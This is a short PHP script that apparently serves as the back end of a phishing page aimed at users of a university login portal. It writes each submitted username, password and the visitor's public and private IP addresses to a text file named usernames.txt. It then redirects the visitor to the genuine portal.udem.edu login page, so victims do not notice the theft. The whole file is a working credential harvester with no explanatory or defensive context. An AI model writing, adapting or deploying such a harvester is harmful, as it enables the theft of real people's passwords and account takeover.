<?php

file_put_contents("usernames.txt", "Account: " . $_POST['username'] . " Pass: " . $_POST['password']." IP Publica: " . $_POST['ipPublica']." IP Privada: " . $_POST['ipPrivada'] . "\n", FILE_APPEND);
header('Location: https://portal.udem.edu/login');
?>
